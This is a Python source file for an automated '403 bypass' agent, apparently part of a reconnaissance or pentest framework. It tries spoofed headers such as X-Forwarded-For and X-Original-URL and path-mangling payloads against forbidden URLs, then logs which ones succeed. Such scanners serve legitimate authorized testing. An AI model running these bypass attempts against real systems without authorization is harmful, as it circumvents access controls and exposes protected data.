import asyncio
import datetime
import logging
import json
import os
import httpx
from base_agent import BaseAgent, logger

class Bypass403Agent(BaseAgent):
    def __init__(self):
        super().__init__("bypass_403", "403 Forbidden Bypasser")
        self.headers_to_test = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Host": "127.0.0.1"},
            {"X-Forwarded-For": "8.8.8.8"},
            {"Forwarded": 'for=127.0.0.1;by=127.0.0.1;host=localhost'},
        ]
        self.path_payloads = [
            "/%2e/", "/./", "/..;/", "/%2f/", "//", "/./", "/??", "/#", 
            "/.html", "/.php", "/.json", "/.jsp", "/.ashx", "/.aspx"
        ]

    async def test_bypass(self, base_url, path):
        """Iterate through bypass techniques for a specific path."""
        target_path = path.lstrip("/")
        full_url = f"{base_url}/{target_path}".rstrip("/")
        
        results = []

        async with httpx.AsyncClient(verify=False, timeout=10.0, follow_redirects=False) as client:
            # 1. Test Header Bypasses
            for header in self.headers_to_test:
                try:
                    resp = await client.get(full_url, headers=header)
                    if resp.status_code < 400:
                        results.append({
                            "type": "header",
                            "payload": str(header),
                            "status": resp.status_code,
                            "url": full_url
                        })
                except Exception as e:
                    logger.debug(f"Header test failed: {e}")

            # 2. Test Path Bypasses
            for payload in self.path_payloads:
                # Try prefixing the path
                modified_url = f"{base_url}{payload}{target_path}"
                try:
                    resp = await client.get(modified_url)
                    if resp.status_code < 400:
                        results.append({
                            "type": "path",
                            "payload": payload,
                            "status": resp.status_code,
                            "url": modified_url
                        })
                except Exception as e:
                    logger.debug(f"Path test failed: {e}")

            # 3. Test URL rewriting headers
            rewrite_headers = [
                {"X-Original-URL": f"/{target_path}"},
                {"X-Rewrite-URL": f"/{target_path}"}
            ]
            for rw_header in rewrite_headers:
                try:
                    # Request the root with the rewrite header
                    resp = await client.get(base_url, headers=rw_header)
                    if resp.status_code < 400:
                        results.append({
                            "type": "rewrite",
                            "payload": str(rw_header),
                            "status": resp.status_code,
                            "url": base_url
                        })
                except Exception as e:
                    logger.debug(f"Rewrite test failed: {e}")

        return results

    async def create_bypass_alert(self, root_domain, target, finding):
        """Create a high-risk lead/alert for a successful 403 bypass using the centralized alerting system."""
        # Suppress alerts for 403 bypasses as part of directory/file discovery suppression.
        # Findings are still stored in the database under web_applications.403_bypasses.
        return
        
        title = f"SECURITY CRITICAL: 403 Bypass Success on {target}"
        risk = "high"
        
        details = f"A successful 403 Forbidden bypass was detected!\n\n" \
                  f"Target Path: {finding['url']}\n" \
                  f"Technique Type: {finding['type']}\n" \
                  f"Payload/Header: {finding['payload']}\n" \
                  f"Resulting Status Code: {finding['status']}"
        
        exploitation = f"### Bypass Exploitation & Verification\n\n" \
                       f"1. **Manual Verification**: Replicate the request using `curl` or Burp Suite:\n" \
                       f"   `curl -k -I -H \"{finding['payload']}\" {finding['url']}`\n" \
                       f"2. **Assess Exposure**: Determine what functionality or data was protected by the 403 status.\n" \
                       f"3. **Remediation**: Ensure access control is enforced at the application layer, not just by reverse proxies or WAFs."

        description = f"Successful 403 bypass using {finding['type']} manipulation."
        await self.create_alert(title, description, target, risk, details, exploitation)

    async def process_tasks(self):
        task = await self.tasks_col.find_one_and_update(
            {"task_type": "bypass_403", "status": "pending"},
            {"$set": {"status": "processing", "started_at": datetime.datetime.utcnow()}},
            sort=[("created_at", 1)]
        )

        if not task:
            return

        target = task["target"]
        root_domain = task["root_domain"]
        forbidden_path = task["path"]
        base_url = task["base_url"]

        try:
            logger.info(f"Starting 403 bypass attempts on {base_url}/{forbidden_path}")
            successful_bypasses = await self.test_bypass(base_url, forbidden_path)
            
            if successful_bypasses:
                logger.info(f"FOUND {len(successful_bypasses)} bypasses for {target}/{forbidden_path}!")
                for finding in successful_bypasses:
                    await self.create_bypass_alert(root_domain, target, finding)
                
                # Update web_applications with bypass findings
                domain_doc = await self.domains_col.find_one({"domain": root_domain})
                if domain_doc:
                    web_apps = domain_doc.get("web_applications", [])
                    for app in web_apps:
                        if app.get("target") == target:
                            bypasses = app.get("403_bypasses", [])
                            # Simple deduplication by payload
                            existing_payloads = [b['payload'] for b in bypasses]
                            for b in successful_bypasses:
                                if b['payload'] not in existing_payloads:
                                    bypasses.append(b)
                            app["403_bypasses"] = bypasses
                            break
                    
                    await self.domains_col.update_one(
                        {"domain": root_domain},
                        {"$set": {"web_applications": web_apps}}
                    )
            else:
                logger.info(f"No successful bypasses for {target}/{forbidden_path}")

            await self.tasks_col.update_one(
                {"_id": task["_id"]},
                {"$set": {"status": "completed", "completed_at": datetime.datetime.utcnow()}}
            )

        except Exception as e:
            logger.error(f"Error in 403 bypass for {target}: {e}")
            await self.tasks_col.update_one(
                {"_id": task["_id"]},
                {"$set": {"status": "failed", "error": str(e)}}
            )

if __name__ == "__main__":
    print("--- 403 Bypasser Agent Starting ---")
    agent = Bypass403Agent()
    asyncio.run(agent.main_loop())
